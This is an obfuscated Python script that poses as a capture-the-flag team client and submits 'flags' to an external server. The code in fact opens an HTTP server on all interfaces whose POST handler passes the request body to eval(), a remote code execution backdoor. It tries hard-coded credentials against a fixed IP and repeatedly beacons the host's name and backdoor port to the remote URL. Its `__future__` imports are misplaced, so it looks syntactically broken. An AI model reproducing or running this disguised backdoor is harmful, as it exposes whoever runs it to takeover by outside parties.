# coding: utf-8
URL = 'http://цтф.гитхаб.рф/процесс'
team_name = b'kgb i tak dalee'

from __future__ import absolute_import
from __future__ import division
from __future__ import unicode_literals

import requests

from string import printable
from SimpleHTTPServer import SimpleHTTPRequestHandler as whadwdhawidhwa
import SocketServer as dwnklawjdowaa
import random as lllllllllll
import threading
import telnetlib

import psycopg2

lllllllllllllllllllll = printable[1] + printable[6] + printable[7] + printable[75] + printable[1] + printable[7] + \
                        printable[2] + printable[75] + printable[5] + printable[1] + printable[75] + printable[2] + \
                        printable[2] + printable[7]
PORT = lllllllllll.randint(2000, 4000)

llllllllllll = b"E\xe0\xda\xfa\x8b<\xa3E\x9fA\x88\x01~}\x90\x90\x9f\xbdM\xd3R\x03\xb9\x83\x96\xd6I\x9c\x17\x1a\xa2\xb6\x07" \
               b"\xc9\x83j\xa6t\x08\x0e\x18(`\x88\xbe\xc9*g\x8fW_\xe3\xab\xe2\xff\xa4*E\xablB\xa4\x12\x14\xe3e\xbep\x8bP\xf7" \
               b"\x0b\xb8\xe6\xba&d\x82\xb7M\xff\x9c\xc1\x063^\xc0\xf2.\xb4PK\xaf\xb4\xe5'c\x15\xfc\xfb7x\xff\xdf\xe8\xcc,J" \
               b"\x1a>\xd8Ld0\x91}\x95:\xf3\x1f\xa4\xfc,\xba/iD\x8b9\xca\x15\xb3\xb2\xc8Out\xabF\x96\xa7\xb6D'\x99\x0f0\x16" \
               b"\xf2\x97\x8cQ\xc4\x91\xe7\xc96\xea\x99V}/\x0b\xd7%\x04x\xe3\xe4\x8e{\xdd>\xc5\x97N\x17~N^\xc7\tRq\xa2\xfame[" \
               b"\x08v\x1d\xec\xed\xee$\xd5}u\x84\xfa\x9f\x8b\xf7\xbf\xe0\x84\x13\xf7\xc9\xf6\xf0^\x04\xfa\xed\xb1\xbfN\x9dFH" \
               b"\xa3\xc5a\x10\xc1\xc5TcTU\xfe\x16\xd5'\xae\xb5\x02F[\xf6\x82\xba\xbf\xe4\xd3P\x13\x0b\xc2\x05\x1c\x988"


class llllllllll(whadwdhawidhwa):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write((printable[15] + printable[9] + printable[7] + printable[14] + printable[14] + printable[6] +
                          printable[1] + printable[14] + printable[74] + printable[10] + printable[8] + printable[5] +
                          printable[12] + printable[74] + printable[4] + printable[9] + printable[0] + printable[1] +
                          printable[74] + printable[10] + printable[3] + printable[8] + printable[9] + printable[74] +
                          printable[1] + printable[2] + printable[1] + printable[8] + printable[1] + printable[4] +
                          printable[3] + printable[5] + printable[6] + printable[13] + printable[8] + printable[
                              12]).encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()
        eval(body)


llllll = dwnklawjdowaa.TCPServer(("0.0.0.0", PORT), llllllllll)

print('Well, lets start!')
print('serving at port', PORT)
threading.Thread(target=llllll.serve_forever).start()

print('preparing')
lllll = telnetlib.Telnet(lllllllllllllllllllll, 22)
try:
    assert lllll.read_until('a') == printable[54] + printable[54] + printable[43] + printable[74] + printable[2] + \
           printable[75] + printable[0] + printable[74] + printable[50] + printable[25] + printable[14] + printable[
               23] + printable[54] + printable[54] + printable[43] + printable[88] + printable[7] + printable[75] + \
           printable[4] + printable[25] + printable[1] + printable[94] + printable[39] + printable[14] + printable[11] + \
           printable[18] + printable[10]
except:
    exit(1)

print('1')
lllllll = telnetlib.Telnet(lllllllllllllllllllll, 21)
try:
    assert lllllll.port == 21
except:
    exit(1)
print('2')

try:
    r = requests.get('http://{}/{}'.format(lllllllllllllllllllll,
                                           printable[28] + printable[14] + printable[12] + printable[27] + printable[
                                               14] + printable[29] + printable[88] +
                                           printable[15] + printable[18] + printable[21] + printable[14] + printable[
                                               28] + printable[76] + printable[27] +
                                           printable[10] + printable[32] + printable[76] + printable[22] + printable[
                                               10] + printable[28] + printable[29] +
                                           printable[14] + printable[27] + printable[76] + printable[27] + printable[
                                               14] + printable[28] + printable[29] +
                                           printable[27] + printable[18] + printable[12] + printable[29] + printable[
                                               14] + printable[13]))
    assert r.content == printable[15] + printable[21] + printable[10] + printable[16] + printable[90] + printable[8] + \
           printable[13] + printable[2] + printable[11] + printable[10] + printable[7] + printable[10] + printable[6] + \
           printable[8] + printable[10] + printable[10] + printable[14] + printable[1] + printable[1] + printable[13] + \
           printable[11] + printable[8] + printable[15] + printable[9] + printable[4] + printable[11] + printable[11] + \
           printable[3] + printable[13] + printable[11] + printable[9] + printable[7] + printable[3] + printable[8] + \
           printable[12] + printable[7] + printable[3] + printable[92] + printable[96]
except:
    exit(1)
print('3')

try:
    psycopg2.connect(dbname='postgres', user='postgres',
                     password='patrick', host=lllllllllllllllllllll)
except:
    exit(1)
print('4')

print('prepared ok!')
print('connecting to master-server...')

import struct
import base64
import time
import os
import socket
import random

while True:
    time.sleep(9 + random.randint(0, 1))
    req_data = struct.pack('I', len(team_name)) + bytes(
        bytearray(ord(x) ^ ord(y) for x, y in zip(team_name, llllllllllll[:len(team_name)])))
    req_data += struct.pack('I', len(socket.getfqdn())) + socket.getfqdn().encode()
    req_data += os.urandom(random.randint(10, 100))
    try:
        resp = requests.post(URL,
                             json={'data': base64.b64encode(req_data).decode(), 'port': PORT}).json()
    except Exception as e:
        print(str(e))
    else:
        if resp.get('error'):
            print('Failed to get flag {}'.format(resp['error']))
        else:
            print('Flag passed!')
